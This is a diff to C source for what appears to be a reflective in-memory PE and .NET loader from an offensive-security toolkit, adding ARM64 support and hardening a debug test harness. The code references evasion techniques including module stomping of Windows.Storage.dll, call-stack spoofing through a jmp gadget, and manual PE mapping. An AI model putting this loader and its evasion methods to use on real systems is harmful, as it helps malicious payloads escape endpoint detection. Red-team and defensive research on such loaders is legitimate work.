     if (result->headers->OptionalHeader.AddressOfEntryPoint != 0) 
@@ -1551,6 +1855,8 @@ static int _find(const void *a, const void *b)
 
 #ifdef _M_X64
 #define IP Rip
+#elif defined(_M_ARM64)
+#define IP Pc
 #else
 #define IP Eip
 #endif
@@ -1742,8 +2048,9 @@ static DWORD HandleExitBehavior(void)
 
     if (mode == 3) {
 
+#if DW_HAS_STACK_SPOOFING
         //
-        // LoudSunRun -> we need a gadget to perform the return to this function 
+        // LoudSunRun -> we need a gadget to perform the return to this function
         //
 
         HMODULE moduleKernel32 = hlpGetModuleHandle((wchar_t*)inst->wsKernel32DLL);
@@ -1769,6 +2076,11 @@ static DWORD HandleExitBehavior(void)
         for (;;) {
             SpoofWithReturn(1000, NULL, NULL, NULL, &p, inst->api.Sleep, (PVOID)0);
         }
+#else
+        for (;;) {
+            inst->api.Sleep(1000);
+        }
+#endif
     }
 
     if (mode == 2) {
@@ -1888,9 +2200,40 @@ FARPROC MemoryGetProcAddress(INSTANCE* inst, HMEMORYMODULE mod, LPCSTR name)
 
 #ifdef DEBUG_OUTPUT
 
+#if defined(_M_ARM64)
+#define DW_DEBUG_GOODCLR_PATH ".\\bin\\arm64\\goodClr.dll"
+#elif defined(_M_X64)
+#define DW_DEBUG_GOODCLR_PATH ".\\bin\\x64\\goodClr.dll"
+#else
+#define DW_DEBUG_GOODCLR_PATH ".\\bin\\x86\\goodClr.dll"
+#endif
+
+static void DebugConfigureOutput(void)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+static int DebugExceptionFilter(PEXCEPTION_POINTERS exceptionInfo)
+{
+    DWORD code = 0;
+    void* address = NULL;
+
+    if (exceptionInfo && exceptionInfo->ExceptionRecord)
+    {
+        code = exceptionInfo->ExceptionRecord->ExceptionCode;
+        address = exceptionInfo->ExceptionRecord->ExceptionAddress;
+    }
+
+    printf("[!] LoaderTest exception 0x%08lX at %p\n", code, address);
+    fflush(stdout);
+    return EXCEPTION_EXECUTE_HANDLER;
+}
+
 
 int testGenric(char* peFilename1, int isDll, char* methodeName, int isDotNet, char* cmdLine)
-{			
+{
+    DebugConfigureOutput();
     printf("[ ] testGenric %s %d %s %d %s\n", peFilename1, isDll, methodeName, isDotNet, cmdLine);
 
     INSTANCE* inst;
@@ -1904,12 +2247,16 @@ int testGenric(char* peFilename1, int isDll, char* methodeName, int isDotNet, ch
 	strncat((char*)inst->sVirtualAlloc, "VirtualAlloc", 12);
 	strncat((char*)inst->sVirtualFree, "VirtualFree", 11);
 	strncat((char*)inst->sVirtualProtect, "VirtualProtect", 14);
+	strncat((char*)inst->sGetNativeSystemInfo, "GetNativeSystemInfo", 20);
+#if DW_HAS_STACK_SPOOFING
 	strncat((char*)inst->sRtlLookupFunctionEntry, "RtlLookupFunctionEntry", 22);
 	strncat((char*)inst->sBaseThreadInitThunk, "BaseThreadInitThunk", 19);
 	strncat((char*)inst->sRtlUserThreadStart, "RtlUserThreadStart", 18);
+#endif
 	strncat((char*)inst->sGetCommandLineA, "GetCommandLineA", 15);
-	strncat((char*)inst->sGetCommandLineW, "GetCommandLineW", 15);
+#if DW_HAS_RUNTIME_FUNCTION_TABLE
     strncat((char*)inst->sRtlAddFunctionTable, "RtlAddFunctionTable", 19);
+#endif
     strncat((char*)inst->sSleep, "Sleep", 5);
     strncat((char*)inst->sAddVectoredExceptionHandler, "RtlAddVectoredExceptionHandler", 30);
     strncat((char*)inst->sRemoveVectoredExceptionHandler, "RtlRemoveVectoredExceptionHandler", 33);
@@ -1919,35 +2266,52 @@ int testGenric(char* peFilename1, int isDll, char* methodeName, int isDotNet, ch
     strncat((char*)inst->sGetCurrentProcess, "GetCurrentProcess", 17);
     strncat((char*)inst->sRtlExitUserProcess, "RtlExitUserProcess", 18);
 
-    inst->exitMode = 3;
+    // DEBUG_OUTPUT test mode: let LoaderTest regain control after the payload export.
+    inst->exitMode = 0;
 
 	strncat((char*)inst->sKernel32DLL, "kernel32.dll", 12);
 	strncat((char*)inst->sKernelBaseDLL, "kernelbase.dll", 14);
 	strncat((char*)inst->sNtDLL, "ntdll.dll", 9);
 	wcsncat((wchar_t*)inst->wsKernel32DLL, L"KERNEL32.DLL", 12);
 
-    strncat((char*)inst->sMsvcrtDLL, "msvcrt.dll", 10);
-    strncat((char*)inst->sPrintf, "printf", 6);
-    strncat((char*)inst->sDebug, "debug\n", 7);
-
     strncat((char*)inst->sDataSec, ".data", 5);
+#if DW_HAS_RUNTIME_FUNCTION_TABLE
     strncat((char*)inst->sPDataSec, ".pdata", 6);
+#endif
+#if DW_HAS_STACK_SPOOFING
     strncat((char*)inst->sGadget, "\xFF\x23", 2);
+#endif
 
-    inst->isModuleStompingUsed=1;
+    inst->isModuleStompingUsed=0;
 	strncat((char*)inst->sModuleToStomp, "Windows.Storage.dll", 19);
 
 
     // Load module in memory
     FILE *peFile = fopen(peFilename1, "rb");
+    if (!peFile)
+    {
+        printf("[!] Cannot open executable file: %s\n", peFilename1);
+        return -1;
+    }
 	fseek(peFile, 0, SEEK_END);
 	long peFileSize = ftell(peFile);
 	fseek(peFile, 0, SEEK_SET);
-	
-    void* peBuffer = VirtualAlloc(NULL, peFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-	fread(peBuffer , peFileSize, 1, peFile);
-	fclose(peFile);	
+    void* peBuffer = VirtualAlloc(NULL, peFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!peBuffer)
+    {
+        printf("[!] Cannot allocate executable buffer of size %ld\n", peFileSize);
+        fclose(peFile);
+        return -1;
+    }
+
+	if (fread(peBuffer , peFileSize, 1, peFile) != 1)
+    {
+        printf("[!] Cannot read executable file: %s\n", peFilename1);
+        fclose(peFile);
+        return -1;
+    }
+	fclose(peFile);
 
     printf("[ ] Executable file: %s\n", peFilename1);
     printf("[ ] Executable size: %ld\n", peFileSize);
@@ -1973,15 +2337,31 @@ int testGenric(char* peFilename1, int isDll, char* methodeName, int isDotNet, ch
         inst->isDotNet = 1;
 
         // Load module in memory
-        FILE *peDotNetLoader= fopen(".\\goodClr.dll", "rb");
+        FILE *peDotNetLoader= fopen(DW_DEBUG_GOODCLR_PATH, "rb");
+        if (!peDotNetLoader)
+        {
+            printf("[!] Cannot open DotNet loader: %s\n", DW_DEBUG_GOODCLR_PATH);
+            return -1;
+        }
         fseek(peDotNetLoader, 0, SEEK_END);
         long peDotNetLoaderSize = ftell(peDotNetLoader);
         fseek(peDotNetLoader, 0, SEEK_SET);
-        
-        void* peDotNetLoaderBuffer = VirtualAlloc(NULL, peDotNetLoaderSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-        fread(peDotNetLoaderBuffer , peDotNetLoaderSize, 1, peDotNetLoader);
-        fclose(peDotNetLoader);	
+        void* peDotNetLoaderBuffer = VirtualAlloc(NULL, peDotNetLoaderSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!peDotNetLoaderBuffer)
+        {
+            printf("[!] Cannot allocate DotNet loader buffer of size %ld\n", peDotNetLoaderSize);
+            fclose(peDotNetLoader);
+            return -1;
+        }
+
+        if (fread(peDotNetLoaderBuffer , peDotNetLoaderSize, 1, peDotNetLoader) != 1)
+        {
+            printf("[!] Cannot read DotNet loader: %s\n", DW_DEBUG_GOODCLR_PATH);
+            fclose(peDotNetLoader);
+            return -1;
+        }
+        fclose(peDotNetLoader);
 
         inst->ptrModuleTst = peDotNetLoaderBuffer;
         inst->dotnetLoaderSize = peDotNetLoaderSize;
@@ -2010,17 +2390,33 @@ int testGenric(char* peFilename1, int isDll, char* methodeName, int isDotNet, ch
 
     printf("[+] Loader launch\n");
 
-    Loader(inst);
+    int loaderResult = 0;
+    __try
+    {
+        loaderResult = Loader(inst);
+    }
+    __except(DebugExceptionFilter(GetExceptionInformation()))
+    {
+        return -1;
+    }
 
-    printf("[+] Loader end\n");
-    
-	return 0;
+    printf("[+] Loader end (%d)\n", loaderResult);
+
+    if (inst->exitMode == 0)
+    {
+        // Avoid normal process teardown after manually mapped test payloads.
+        fflush(stdout);
+        TerminateProcess(GetCurrentProcess(), (UINT)loaderResult);
+    }
+
+	return loaderResult;
 }
 
 
 int main(int argc, char* argv[])
 {
-    if (argc < 6) 
+    DebugConfigureOutput();
+    if (argc < 6)
     {
         printf("Usage: %s <peFilename> <isDll> <methodName> <isDotNet> <cmdLine>\n", argv[0]);
         return 1;
